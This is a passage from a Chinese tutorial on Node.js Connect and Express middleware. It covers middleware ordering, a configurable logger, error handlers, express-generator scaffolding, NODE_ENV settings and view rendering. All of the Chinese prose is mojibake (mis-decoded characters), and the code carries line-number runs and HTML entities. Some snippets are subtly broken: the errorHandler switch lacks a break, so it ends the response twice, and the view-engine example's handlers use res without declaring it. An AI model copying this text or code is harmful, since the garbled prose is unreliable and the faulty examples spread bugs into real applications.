èƒ½åœæ­¢æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç»„åˆä¸­é—´ä»¶å®žçŽ°ç”¨æˆ·è®¤è¯ä¹‹ç±»çš„åŠŸèƒ½ã€‚ å°è¯•è°ƒæ¢é¡ºåºï¼š 1234567891011121314const connect = require('connect');function logger(req,res,next)&#123; console.log('%s %s',req.method,req.url); next();&#125;function hello(req,res)&#123; res.setHeader('Content-Type','text/plain'); res.end('Hello world');&#125;connect().use(hello).use(logger).listen(3000); ä¸Šé¢ä¾‹å­å…ˆè°ƒç”¨ hello,ç¨‹åºå¦‚æœŸè¿”å›žå“åº”ç»“æžœï¼Œä½† logger æ°¸è¿œä¹Ÿä¸ä¼šæ‰§è¡Œï¼Œå› ä¸º hello æ²¡æœ‰è°ƒç”¨ next().æ‰€ä»¥æŽ§åˆ¶æƒæ²¡æœ‰äº¤å›žç»™åˆ†æ´¾å™¨ï¼Œå®ƒä¹Ÿä¸èƒ½è°ƒç”¨ä¸‹ä¸€ä¸ªä¸­é—´ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœæŸä¸ªä¸­é—´ä»¶ä¸è°ƒç”¨ next(),é‚£é“¾åœ¨å®ƒåŽé¢çš„ä¸­é—´ä»¶å°±ä¸ä¼šè¢«è°ƒç”¨äº†ã€‚ åˆ›å»ºå¯é…ç½®çš„ä¸­é—´ä»¶ ä¸ºäº†å¯é…ç½®ï¼Œä¸­é—´ä»¶ä¸€èˆ¬ä¼šéµå¾ªä¸€ä¸ªç®€å•çš„æƒ¯ä¾‹ï¼šç”¨ä¸€ä¸ªå‡½æ•°è¿”å›žå¦ä¸€ä¸ªå‡½æ•°ï¼ˆé—­åŒ…ï¼‰ï¼Œè¿™ç§å¯é…ç½®ä¸­é—´ä»¶çš„åŸºæœ¬ç»“æž„å¦‚ä¸‹æ‰€ç¤º: 12345678function setup(options)&#123; // è®¾ç½®é€»è¾‘ return function(req,res,next)&#123; // ä¸­é—´ä»¶é€»è¾‘ &#125;&#125;// ç”¨æ³•app.use(setup(&#123;some:'options'&#125;)); æ³¨æ„ app.use ä¸­çš„ setup å‡½æ•°ï¼Œä¹‹å‰æ”¾çš„æ˜¯å¯¹ä¸­é—´ä»¶å‡½æ•°çš„å¼•ç”¨. åˆ›å»ºä¸€ä¸ªå¯ä»¥ä¼ å‚(å­—ç¬¦ä¸²å‚æ•°)è‡ªå·±é…ç½®çš„ logger ä¸­é—´ä»¶ï¼š 12345678910111213// logger.jsfunction setup(format) &#123; const regexp = /:(\w+)/g; return function createLogger(req, res, next) &#123; const str = format.replace(regexp, (match, property) =&gt; &#123; return req[property]; &#125;); console.log(str); next(); &#125;&#125;module.exports = setup; çŽ°åœ¨è¿™ä¸ª logger æˆäº†å¯é…ç½®çš„ä¸­é—´ä»¶ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥åœ¨åŒä¸€ç¨‹åºä¸­ç»™.use()ä¼ å…¥ä¸åŒé…ç½®çš„ loggerï¼Œå¹¶ä¸”ä¸ºäº†ä¿æŒä¸€è‡´æ€§ï¼Œæ‰€æœ‰ Connect æ ¸å¿ƒä¸­é—´ä»¶éƒ½æ˜¯å¯é…ç½®çš„ã€‚ è°ƒç”¨ï¼š 12345678910111213141516const setup = require('./logger.js');const connect = require('connect');function logger(req, res, next) &#123; console.log('%s %s', req.method, req.url); next();&#125;function hello(req, res) &#123; res.setHeader('Content-Type', 'text/plain'); res.end('Hello world');&#125;connect() .use(setup(':method :url')) .use(hello) .listen(3000); ä½¿ç”¨é”™è¯¯å¤„ç†ä¸­é—´ä»¶Connect ä¸­é—´æœ‰ä¸€ç§ç”¨æ¥å¤„ç†é”™è¯¯çš„ä¸­é—´ä»¶å˜ä½“ï¼Œè·Ÿå¸¸è§„çš„ä¸­é—´ä»¶ç›¸æ¯”ï¼Œé™¤äº†è¯·æ±‚ã€å“åº”å¯¹è±¡å¤–ï¼Œé”™è¯¯å¤„ç†ä¸­é—´ä»¶çš„å‚æ•°è¿˜å¤šäº†ä¸€ä¸ªé”™è¯¯å¯¹è±¡ã€‚ Connect åˆ»æ„å°†å¤„ç†åšåˆ°å¾ˆç®€å•ï¼Œè®©å¼€å‘äººå‘˜æŒ‡æ˜Žå¦‚ä½•å¤„ç†é”™è¯¯ã€‚æ¯”å¦‚ï¼Œå¯ä»¥åªè®©ç³»ç»Ÿå’Œç¨‹åºçº§é”™è¯¯é€šè¿‡ä¸­é—´ä»¶ï¼Œæˆ–è€…åªè®©ç”¨æˆ·é”™è¯¯é€šè¿‡ï¼Œæˆ–è€…è®©ä¸¤è€…ç»“åˆçš„ç»„åˆé€šè¿‡ã€‚ ä»‹ç»é”™è¯¯å¤„ç†ä¸­é—´ä»¶çš„å·¥ä½œæœºåˆ¶ä»¥åŠä¸€äº›ä½¿ç”¨çš„æ¨¡å¼ï¼š ç”¨Connect çš„é»˜è®¤é”™è¯¯å¤„ç†å™¨ å› ä¸ºå‡½æ•° foo() æ²¡æœ‰å®šä¹‰ã€‚æ‰€ä»¥ä¸‹é¢çš„è¿™ä¸ªä¸­é—´ä»¶ä¼šæŠ›å‡ºé”™è¯¯ ReferenceError: 1234567const connect = require('connect');connect().use((req,res)=&gt;&#123; foo(); res.setHeader('Content-Type','text/plain'); res.end('hello world');&#125;).listen(3000); Connect é»˜è®¤çš„å¤„ç†æ—¶è¿”å›žçŠ¶æ€ç  500ï¼Œå“åº”ä¸»ä½“çš„æ–‡æœ¬æ˜¯ Internal Server Error å’Œé”™è¯¯çš„è¯¦ç»†ä¿¡æ¯ã€‚ä½†åœ¨çœŸæ­£çš„ç¨‹åºä¸­ï¼Œä¸€èˆ¬è¿˜ä¼šå¯¹è¿™äº›é”™è¯¯åšäº›ç‰¹æ®Šçš„å¤„ç†ï¼Œæ¯”å¦‚å°†å®ƒä»¬å‘é€ç»™ä¸€ä¸ªæ—¥å¿—å®ˆæŠ¤è¿›ç¨‹ã€‚ è‡ªè¡Œå¤„ç†ç¨‹åºé”™è¯¯ Connect ä¹Ÿæ”¯æŒç”¨é”™è¯¯å¤„ç†ä¸­é—´ä»¶è‡ªè¡Œå¤„ç†é”™è¯¯ï¼Œæ¯”å¦‚è¯´ï¼Œä¸ºäº†åœ¨å¼€å‘æ—¶çœ‹åˆ°ç®€å•å¿«æ·çš„é”™è¯¯æŠ¥å‘Šï¼Œä½ å¯èƒ½æƒ³ç”¨ JSON æ ¼å¼å‘é€é”™è¯¯ä¿¡æ¯ï¼›è€Œåœ¨ç”Ÿäº§çŽ¯å¢ƒä¸­ï¼Œä¸ºäº†ä¸æŠŠæ•æ„Ÿçš„å†…éƒ¨ä¿¡æ¯æš´éœ²å‡ºæ¥ï¼Œå¯ä»¥å‘é€ä¸€ä¸ªç®€å•çš„æœåŠ¡å™¨é”™è¯¯å“åº”ã€‚ é”™è¯¯å¤„ç†ä¸­é—´ä»¶å‡½æ•°å¿…é¡»æœ‰å››ä¸ªå‚æ•°ï¼šerr,req,reså’Œnextã€‚ 123456789101112131415// errors.jsconst env = process.env.NODE_ENV || 'development';function errorHandler(err, req, res, next) &#123; res.statusCode = 500; switch (env) &#123; case 'development': console.log('Error:'); console.log(err); res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify(err)); default: res.end('Server Error'); &#125;&#125;module.exports = errorHandler; ç”¨ NODE_ENV è®¾å®šç¨‹åºçš„æ¨¡å¼ Connect ä¸€èˆ¬ä¼šæ ¹æ®çŽ¯å¢ƒå˜é‡ NODE_ENV(process.env.NODE_ENV) æ¥åˆ‡æ¢ä¸åŒæœåŠ¡å™¨çŽ¯å¢ƒçš„è¡Œä¸ºã€‚ å½“ Connect é‡åˆ°é”™è¯¯æ—¶ï¼Œå®ƒä¼šåˆ‡æ¢ï¼ŒåªåŽ»è°ƒç”¨é”™è¯¯å¤„ç†ä¸­é—´ä»¶ï¼Œå¦‚ä¸‹å›¾ï¼š å‡è®¾æœ‰ä¸€ä¸ªå…è®¸ç”¨æˆ·ç™»å½•åˆ°ç®¡ç†åŒºåŸŸçš„åšå®¢ç¨‹åºã€‚å¦‚æžœè´Ÿè´£ç”¨æˆ·è·¯ç”±çš„ä¸­é—´ä»¶å¼•å‘äº†ä¸€ä¸ªé”™è¯¯ï¼Œåˆ™ä¸­é—´ä»¶ blog å’Œ admin éƒ½ä¼šè¢«è·³è¿‡ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯é”™è¯¯å¤„ç†ä¸­é—´ä»¶ï¼ˆåªæœ‰ä¸‰ä¸ªå‚æ•°ï¼‰ã€‚ç„¶åŽ Connect çœ‹åˆ°æŽ¥å—é”™è¯¯å‚æ•°çš„ errorHandlerï¼Œå°±ä¼šè°ƒç”¨å®ƒã€‚ä¸­é—´ä»¶çœ‹èµ·æ¥åƒä¸‹é¢è¿™æ ·ï¼š 12345connect() .use(router(require('./routes/user'))) .use(router(require('./routes/blog'))) // è·³è¿‡ .use(router(require('./routes/admin'))) // è·³è¿‡ .use(errorHandler); åŸºäºŽä¸­é—´ä»¶çš„æ‰§è¡Œé¡ºåºçŸ­è·¯æŸäº›åŠŸèƒ½æ˜¯ç»„ç»‡ Express ç¨‹åºçš„åŸºæœ¬æ¦‚å¿µã€‚ Expressç”Ÿæˆç¨‹åºçš„æ¡†æž¶Express å¯¹ç¨‹åºç»“æž„ä¸ä½œè¦æ±‚ï¼Œè·¯ç”±å¯ä»¥æ”¾åœ¨å¤šä¸ªæ–‡ä»¶ä¸­ï¼Œå…¬å…±èµ„æºæ–‡ä»¶ä¹Ÿå¯ä»¥æ”¾åˆ°ä»»ä½•ç›®å½•ä¸‹ã€‚æœ€ç®€å•çš„ Express ç¨‹åºå¯èƒ½åƒä¸‹é¢è¿™æ ·ï¼Œä½†å®ƒä»ç„¶æ˜¯ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„ HTTP æœåŠ¡å™¨ã€‚ 123456const express = require('express');const app = express();app.get('/',(req,res) =&gt;&#123; res.end('Hello');&#125;);app.listen(3000); å®‰è£… Express çš„å¯æ‰§è¡Œç¨‹åº é¦–å…ˆè¦ç”¨ npm å…¨å±€å®‰è£… express-generatorï¼š 1npm install -g express-generator è£…å¥½ä¹‹åŽï¼Œå¯ä»¥ç”¨ â€“help é€‰é¡¹çœ‹çœ‹å¯ç”¨çš„é€‰é¡¹ ç”Ÿæˆç¨‹åº ç”¨-eï¼ˆæˆ–â€“ejsï¼‰æŒ‡å®šè¦ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“Žæ˜¯ EJSï¼Œæ‰§è¡Œ express -e shoutboxï¼Œä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„ç¨‹åºä¼šå‡ºçŽ°åœ¨ shoutbox ç›®å½•ä¸­ã€‚å…¶ä¸­ä¼šæœ‰æè¿°é¡¹ç›®å’Œä¾èµ–é¡¹çš„ package.jsonæ–‡ä»¶ã€ç¨‹åºä¸»æ–‡ä»¶ã€public ç›®å½•ï¼Œä»¥åŠä¸€ä¸ªæ”¾è·¯ç”±å¤„ç†å™¨çš„ç›®å½•ã€‚ æŽ¢ç´¢ç¨‹åº åœ¨ç¼–è¾‘å™¨ä¸­æ‰“å¼€ package.json æ–‡ä»¶ï¼Œçœ‹çœ‹ç¨‹åºçš„ä¾èµ–é¡¹ã€‚å®‰è£…ä¾èµ–ï¼š 1npm i ç”Ÿæˆçš„ Express ç¨‹åºæ¡†æž¶: 1234567891011121314151617181920212223242526272829303132333435363738394041424344var createError = require('http-errors');var express = require('express');var path = require('path');var cookieParser = require('cookie-parser');var logger = require('morgan');var indexRouter = require('./routes/index');var usersRouter = require('./routes/users');var app = express();// view engine setupapp.set('views', path.join(__dirname, 'views'));app.set('view engine', 'ejs');// è¾“å‡ºæœ‰é¢œè‰²åŒºåˆ†çš„æ—¥å¿—ï¼Œä»¥ä¾¿äºŽå¼€å‘è°ƒè¯•app.use(logger('dev'));// è§£æžè¯·æ±‚ä¸»ä½“app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());// æä¾›./public ä¸‹çš„é™æ€æ–‡ä»¶app.use(express.static(path.join(__dirname, 'public')));// æŒ‡å®šç¨‹åºè·¯ç”±app.use('/', indexRouter);app.use('/users', usersRouter);// catch 404 and forward to error handlerapp.use(function(req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render('error');&#125;);module.exports = app; åœ¨çº¿ç•™è¨€æ¿ç¨‹åºçš„è§„åˆ’ ä¸‹é¢æ˜¯è¿™ä¸ªåœ¨çº¿ç•™è¨€æ¿ç¨‹åºçš„éœ€æ±‚ã€‚(1) ç”¨æˆ·åº”è¯¥å¯ä»¥æ³¨å†Œã€ç™»å½•ã€é€€å‡ºã€‚(2) ç”¨æˆ·åº”è¯¥å¯ä»¥å‘æ¶ˆæ¯ï¼ˆæ¡ç›®ï¼‰ã€‚(3) ç«™ç‚¹çš„è®¿é—®è€…å¯ä»¥åˆ†é¡µæµè§ˆæ¡ç›®ã€‚(4) åº”è¯¥æœ‰ä¸ªæ”¯æŒè®¤è¯çš„ç®€å•çš„ REST APIã€‚ é’ˆå¯¹è¿™äº›éœ€æ±‚ï¼Œæˆ‘ä»¬è¦å­˜å‚¨æ•°æ®å’Œå¤„ç†ç”¨æˆ·è®¤è¯ï¼Œè¿˜éœ€è¦å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œæ ¡éªŒã€‚å¿…è¦çš„è·¯ç”±åº”è¯¥æœ‰ä»¥ä¸‹ä¸¤ç§ã€‚ API è·¯ç”± GET /api/entries: èŽ·å–æ¡ç›®åˆ—è¡¨ GET /api/page: èŽ·å–å•é¡µæ¡ç›® POST /api/entry:åˆ›å»ºæ–°çš„ç•™è¨€æ¡ç›® Web UI è·¯ç”± GET /postï¼šæ˜¾ç¤ºåˆ›å»ºæ–°æ¡ç›®çš„è¡¨å• POST /postï¼šæäº¤æ–°æ¡ç›® GET /registerï¼šæ˜¾ç¤ºæ³¨å†Œè¡¨å• POST /registerï¼šåˆ›å»ºæ–°çš„ç”¨æˆ·è´¦å· GET /loginï¼šæ˜¾ç¤ºç™»å½•è¡¨å• POST /loginï¼šç™»å½• GET /logoutï¼šé€€å‡º Express å’Œç¨‹åºçš„é…ç½®Express è¿˜æ”¯æŒè‡ªå®šä¹‰çš„é…ç½®é¡¹é”®/å€¼å¯¹ã€‚ è®¾ç½®çŽ¯å¢ƒå˜é‡ åœ¨ Windows ä¸­ç”¨è¿™ä¸ªï¼š 12set NODE_ENV=production node app è¿™äº›çŽ¯å¢ƒå˜é‡ä¼šå‡ºçŽ°åœ¨ç¨‹åºé‡Œçš„ process.env å¯¹è±¡ä¸­ã€‚ Express æœ‰ä¸€ä¸ªæžç®€çš„çŽ¯å¢ƒé©±åŠ¨é…ç½®ç³»ç»Ÿï¼Œè¿™ä¸ªç³»ç»Ÿç”±å‡ ä¸ªæ–¹æ³•ç»„æˆï¼Œå…¨éƒ¨ç”±çŽ¯å¢ƒå˜é‡NODE_ENV é©±åŠ¨ï¼š app.set() app.get() app.enable() app.disable() app.enabled() app.disabled() åŸºäºŽçŽ¯å¢ƒçš„é…ç½®ï¼ŒçŽ¯å¢ƒå˜é‡ NODE_ENV æºäºŽ Expressï¼Œç”¨å®ƒå‘ŠçŸ¥Node ç¨‹åºåœ¨å“ªä¸ªçŽ¯å¢ƒä¸­ï¼Œå…¶é»˜è®¤çš„æ˜¯å¼€å‘çŽ¯å¢ƒã€‚ app.configure() æ–¹æ³•æœ‰ä¸€ä¸ªå¯é€‰çš„å­—ç¬¦ä¸²å‚æ•°ï¼Œç”¨æ¥æŒ‡å®šè¿è¡ŒçŽ¯å¢ƒã€‚è¿˜æœ‰ä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°ï¼Œå¦‚æžœæœ‰è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™åœ¨è¿è¡ŒçŽ¯å¢ƒä¸Žå­—ç¬¦ä¸²ç›¸åŒæ—¶æ‰ä¼šè°ƒç”¨é‚£ä¸ªå‡½æ•°ã€‚å¦‚æžœæ²¡æœ‰ï¼Œåˆ™åœ¨æ‰€æœ‰çŽ¯å¢ƒä¸­éƒ½ä¼šè°ƒç”¨é‚£ä¸ªå‡½æ•°ï¼Œè¿™äº›çŽ¯å¢ƒçš„åç§°æ˜¯éšæ„çš„ã€‚ä¸ºäº†å®žçŽ°å¯å®šåˆ¶çš„è¡Œä¸ºï¼ŒExpress åœ¨å…¶å†…éƒ¨ä½¿ç”¨äº†é…ç½®ç³»ç»Ÿï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨è‡ªå·±çš„ç¨‹åºä¸­ä½¿ç”¨è¿™ä¸ªç³»ç»Ÿã€‚ Express è¿˜ä¸ºå¸ƒå°”ç±»åž‹çš„é…ç½®é¡¹æä¾›äº† app.set() å’Œ app.get() çš„å˜ä½“ã€‚æ¯”å¦‚è¯´ï¼Œapp.enable (setting)ç­‰åŒäºŽ app.set(setting, true)ï¼Œè€Œ app.enabled(setting)å¯ä»¥ç”¨æ¥æ£€æŸ¥è¯¥å€¼æ˜¯å¦è¢«å¯ç”¨äº†ã€‚app.disable(setting)å’Œ app.disabled(setting)æ˜¯å¯¹å®ƒä»¬çš„è¡¥å……ã€‚ Express ä¸ºå¼€å‘ API æä¾›äº†ä¸€ä¸ªé…ç½®é¡¹ï¼Œå³ json spacesã€‚å¦‚æžœæŠŠå®ƒåŠ åˆ° app.js ä¸­ï¼Œç¨‹åºè¾“å‡º JSON çš„æ ¼å¼ä¼šå˜å¾—æ›´æ˜“è¯»ï¼š 1app.set('json spaces',2); æ¸²æŸ“è§†å›¾ä¸ç®¡æ˜¯æ¸²æŸ“æ•´ä¸ª HTML é¡µé¢ã€ä¸€ä¸ª HTML ç‰‡æ®µï¼Œè¿˜æ˜¯ä¸€ä¸ª RSS é¢„è®¢æºï¼Œå¯¹å‡ ä¹Žæ‰€æœ‰ç¨‹åºæ¥è¯´ï¼Œè§†å›¾æ¸²æŸ“éƒ½éžå¸¸é‡è¦ã€‚å…¶æ¦‚å¿µå¾ˆç®€å•ï¼šæŠŠæ•°æ®ä¼ ç»™è§†å›¾ï¼Œç„¶åŽè§†å›¾å¯¹æ•°æ®è¿›è¡Œè½¬æ¢ï¼Œå¯¹ Webç¨‹åºæ¥è¯´ï¼Œé€šå¸¸æ˜¯è½¬æ¢æˆ HTMLã€‚ Express ä¸­æœ‰ä¸¤ç§æ¸²æŸ“è§†å›¾çš„åŠžæ³•ï¼šç¨‹åºå±‚é¢ç”¨ app.render()ï¼Œåœ¨è¯·æ±‚æˆ–å“åº”å±‚é¢ç”¨res.render() ï¼Œ Express å†…éƒ¨ç”¨çš„æ˜¯å‰ä¸€ç§ã€‚æœ¬ç« åªç”¨ res.render() ã€‚å¦‚æžœä½ çœ‹ä¸€ä¸‹./routes/index.jsï¼Œä¼šçœ‹åˆ°ä¸€ä¸ªè°ƒç”¨ res.render(â€˜indexâ€™)çš„å‡½æ•°ï¼Œæ¸²æŸ“æ˜¯./views/index.ejsæ¨¡æ¿ï¼š 123router.get('/', function(req, res, next) &#123; res.render('index', &#123; title: 'Express' &#125;);&#125;); é…ç½®è§†å›¾ç³»ç»Ÿ æŸ¥æ‰¾ç›®å½•ï¼š 1app.set('views', path.join(__dirname, 'views')); è¿™ä¸ªé…ç½®é¡¹æŒ‡æ˜Žäº† Express æŸ¥æ‰¾è§†å›¾çš„ç›®å½•ï¼Œ__dirname æ˜¯ä¸ªå…¨å±€å˜é‡ï¼Œä»£è¡¨å½“å‰è¿è¡Œçš„æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ã€‚åœ¨å¼€å‘æ—¶ï¼Œè¿™ä¸ªç›®å½•é€šå¸¸å°±æ˜¯å½“å‰å·¥ä½œç›®å½•ï¼ˆCWDï¼‰ï¼Œä½†åœ¨ç”Ÿäº§çŽ¯å¢ƒä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶å¯èƒ½è¿è¡Œåœ¨å…¶ä»–ç›®å½•ä¸­ã€‚__dirname æœ‰åŠ©äºŽä¿æŒè·¯å¾„åœ¨å„ç§çŽ¯å¢ƒä¸­çš„ä¸€è‡´æ€§. ä½¿ç”¨é»˜è®¤çš„æ¨¡æ¿å¼•æ“Žï¼š ä¹‹å‰åœ¨å‘½ä»¤è¡Œä¸­ç”¨ -e æŒ‡å®šæ¨¡æ¿å¼•æ“Ž EJS ï¼Œæ‰€ä»¥ view engine è¢«è®¾å®šä¸º ejs .Express è¦é æ‰©å±•åç¡®å®šå“ªä¸ªæ¨¡æ¿å¼•æ“Žæ¸²æŸ“æ–‡ä»¶ï¼Œæœ‰äº†è¿™ä¸ªé…ç½®é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ index æŒ‡å®šè¦æ¸²æŸ“çš„æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦ index.ejs. ä½¿ç”¨å¸¦æ‰©å±•åçš„æ¨¡æ¿æ–‡ä»¶ï¼Œå°±å¯ä»¥åœ¨åŒä¸€ä¸ª Express ç¨‹åºä¸­ä½¿ç”¨å¤šä¸ªæ¨¡æ¿å¼•æ“Žã€‚åŒæ—¶è¿™æ ·åˆèƒ½æä¾›ä¸€ä¸ªæ¸…æ™°çš„ APIã€‚ æ¯”å¦‚è¯´ï¼Œä½ å‘çŽ°ç”¨å¦ä¸€ç§æ¨¡æ¿å¼•æ“Žå†™ RSS é¢„è®¢æºæ›´å®¹æ˜“ï¼Œæˆ–è€…æ­£è¦æ¢ä¸€ä¸ªæ¨¡æ¿å¼•æ“Žç”¨ã€‚ä½ å¯èƒ½å°† Pug ä½œä¸ºé»˜è®¤å¼•æ“Žï¼Œç”¨ EJS æ¸²æŸ“ /feed è·¯ç”±çš„å“åº”ç»“æžœï¼Œå°±åƒä¸‹é¢çš„ä»£ç ä¸€æ ·æŒ‡æ˜Ž .ejs æ‰©å±•åã€‚ 1234567app.set('view engine','pug');app.get('/',function()&#123; res.render('index');&#125;);app.get('/feed',function()&#123; res.render('rss.ejs');&#125;); è§†å›¾ç¼“å­˜ åœ¨ç”Ÿäº§çŽ¯å¢ƒä¸­ï¼Œview cache æ˜¯é»˜è®¤å¼€å¯çš„ã€‚ä»¥é˜²æ­¢åŽç»­çš„ render() ä»Žç¡¬ç›˜ä¸­è¯»å–æ¨¡å—æ–‡ä»¶ã€‚å› ä¸ºæ¨¡å—æ–‡ä»¶çš„å†…å®¹ä¼šè¢«æ”¾åˆ°å†…å­˜ä¸­ï¼Œæ‰€ä»¥æ€§èƒ½ä¼šå¾—åˆ°æ˜¾è‘—æå‡ã€‚ä½†å¯ç”¨è¿™ä¸ªé…ç½®é¡¹åŽï¼Œåªæœ‰é‡å¯æœåŠ¡å™¨æ‰èƒ½è®©æ¨¡æ¿æ–‡ä»¶çš„ç¼–è¾‘ç”Ÿæ•ˆï¼Œæ‰€ä»¥åœ¨å¼€å‘æ—¶ä¼šç¦ç”¨å®ƒã€‚å¦‚æžœåœ¨åˆ†çº§ï¼ˆstagingï¼‰çŽ¯å¢ƒä¸­è¿è¡Œï¼Œå¾ˆå¯èƒ½è¦å¯ç”¨å’Œè¿™ä¸ªé…ç½®é¡¹ã€‚ view cache è¢«ç¦ç”¨æ—¶ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½ä¼šä»Žç¡¬ç›˜ä¸Šè¯»å–æ¨¡æ¿ã€‚è¿™æ ·æ— é¡»é‡å¯ç¨‹åºæ¥è®©æ¨¡æ¿çš„ä¿®æ”¹ç”Ÿæ•ˆã€‚å¯ç”¨ view cache åŽï¼Œæ¯ä¸ªæ¨¡æ¿åªéœ€è¦è¯»å–ä¸€æ¬¡ç¡¬ç›˜ã€‚ æˆ‘ä»¬çœ‹çœ‹ Expresså¦‚ä½•å®šä½è§†å›¾æ¥æ¸²æŸ“å®ƒä»¬ã€‚ è§†å›¾æŸ¥æ‰¾ æŸ¥æ‰¾è§†å›¾çš„è¿‡ç¨‹è·Ÿ require() æŸ¥æ‰¾çš„è¿‡ç¨‹å·®ä¸å¤šï¼Œåœ¨ç¨‹åºä¸­è°ƒç”¨äº† res.render() æˆ– app.render()åŽï¼ŒExpress ä¼šå…ˆæ£€æŸ¥æœ‰æ²¡æœ‰è¿™æ ·çš„ç»å¯¹è·¯å¾„ï¼ŒæŽ¥ç€æŸ¥æ‰¾ç›®å½•çš„ç›¸å¯¹è·¯å¾„ã€‚æœ€åŽä¼šå°è¯•æ‰¾ç›®å½•ä¸­çš„ index æ–‡ä»¶ã€‚ å› ä¸º ejs è¢«è®¾ä¸ºé»˜è®¤å¼•æ“Žï¼Œæ‰€ä»¥æ— é¡»åœ¨ render ä¸­æŒ‡æ˜Žæ¨¡æ¿æ–‡ä»¶çš„æ‰©å±•å.ejsã€‚ éšç€å¼€å‘è¿›å±•ï¼Œç¨‹åºä¸­çš„è§†å›¾ä¼šè¶Šæ¥è¶Šå¤šï¼Œå¹¶ä¸”æœ‰æ—¶ä¸€ä¸ªèµ„æºä¼šæœ‰å‡ ä¸ªè§†å›¾ã€‚view lookupå¯ä»¥å¸®æˆ‘ä»¬ç»„ç»‡è¿™äº›è§†å›¾ï¼Œæ¯”å¦‚è¯´æŠŠè§†å›¾æ–‡ä»¶æ”¾åœ¨è·Ÿèµ„æºç›¸è¿žçš„å­ç›®å½•ä¸­ã€‚ ç”¨æ·»åŠ å­ç›®å½•çš„åŠžæ³•å¯ä»¥åŽ»æŽ‰æ¨¡æ¿æ–‡ä»¶åç§°ä¸­çš„å†—ä½™éƒ¨åˆ†ï¼Œæ¯”å¦‚ edit-entry.ejså’Œ show-entry.ejsã€‚Express ä¼šæ·»åŠ è·Ÿ view engine åŒ¹é…çš„æ‰©å±•åï¼Œæ ¹æ® res.render(â€˜entries/editâ€™)å®šä½åˆ° ./views/entries/edit.ejsã€‚ Expressä¼šæ£€æŸ¥ viewsçš„å­ç›®å½•ä¸­æ˜¯å¦æœ‰åä¸º indexçš„æ–‡ä»¶ã€‚å½“æ–‡ä»¶çš„åç§°ä¸ºå¤æ•°æ—¶ï¼Œæ¯”å¦‚ entriesï¼Œé€šå¸¸è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªèµ„æºåˆ—è¡¨ã€‚ä¹Ÿå°±æ˜¯è¯´ res.render(â€˜entriesâ€™)ä¸€èˆ¬ä¼šæ¸²æŸ“æ–‡ä»¶views/entries/ index.ejsã€‚ å°†æ•°æ®ä¼ é€’ç»™è§†å›¾çš„åŠžæ³• åœ¨ Express ä¸­ï¼Œè¦ç»™è¢«æ¸²æŸ“çš„è§†å›¾ä¼ é€’æ•°æ®æœ‰å‡ ç§åŠžæ³•ï¼Œå…¶ä¸­æœ€å¸¸ç”¨çš„æ˜¯å°†è¦ä¼ é€’çš„æ•°æ®ä½œä¸º res.render()çš„å‚æ•°ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥åœ¨è·¯ç”±å¤„ç†å™¨ä¹‹å‰çš„ä¸­é—´ä»¶ä¸­è®¾å®šä¸€äº›å˜é‡ï¼Œæ¯”å¦‚ç”¨app.locals ä¼ é€’ç¨‹åºå±‚é¢çš„æ•°æ®ï¼Œç”¨ res.locals ä¼ é€’è¯·æ±‚å±‚é¢çš„æ•°æ®ã€‚ å°†å˜é‡ç›´æŽ¥ä½œä¸º res.render()çš„å‚æ•°ä¼˜å…ˆçº§æœ€é«˜ï¼Œè¦é«˜äºŽåœ¨ res.locals å’Œ app.localsä¸­è®¾å®šçš„å˜é‡å€¼: é»˜è®¤æƒ…å†µä¸‹ï¼ŒExpress åªä¼šå‘è§†å›¾ä¸­ä¼ é€’ä¸€ä¸ªç¨‹åºçº§å˜é‡â€”â€”settingsï¼Œè¿™ä¸ªå¯¹è±¡ä¸­åŒ…å«æ‰€æœ‰ç”¨ app.set()è®¾å®šçš„å€¼ã€‚æ¯”å¦‚ app.set(â€˜titleâ€™, â€˜My Applicationâ€™)ä¼šæŠŠ settings. title è¾“å‡ºåˆ°æ¨¡æ¿ä¸­ï¼Œè¯·çœ‹ä¸‹é¢çš„ EJS ä»£ç ç‰‡æ®µï¼š 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= settings.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= settings.title %&gt;&lt;/h1&gt; &lt;p&gt;Welcome to &lt;%= settings.title %&gt;.&lt;/p&gt; &lt;/body&gt; å®žé™…ä¸Šï¼ŒExpress æ˜¯åƒä¸‹é¢è¿™æ ·è¾“å‡ºè¿™ä¸ªå¯¹è±¡çš„ï¼š 1app.locals.settings = app.settings Express è·¯ç”±å…¥é—¨Express è·¯ç”±çš„ä¸»è¦ä»»åŠ¡æ˜¯å°†ç‰¹å®šæ¨¡å¼ä¸Šçš„ URL åŒ¹é…åˆ°å“åº”é€»è¾‘ä¸Šã€‚ä½†ä¹Ÿå¯ä»¥å°† URL æ¨¡å¼åŒ¹é…åˆ°ä¸­é—´ä»¶ä¸Šï¼Œä»¥ä¾¿äºŽä¸­é—´ä»¶å®žçŽ°æŸäº›è·¯ç”±ä¸Šçš„å¯é‡ç”¨åŠŸèƒ½ã€‚ ç‰¹å®šè·¯ç”±ä¸­é—´ä»¶çš„ç”¨æ³•ã€‚ æ£€éªŒç”¨æˆ·å†…å®¹æäº¤ ç»™ç¨‹åºåŠ 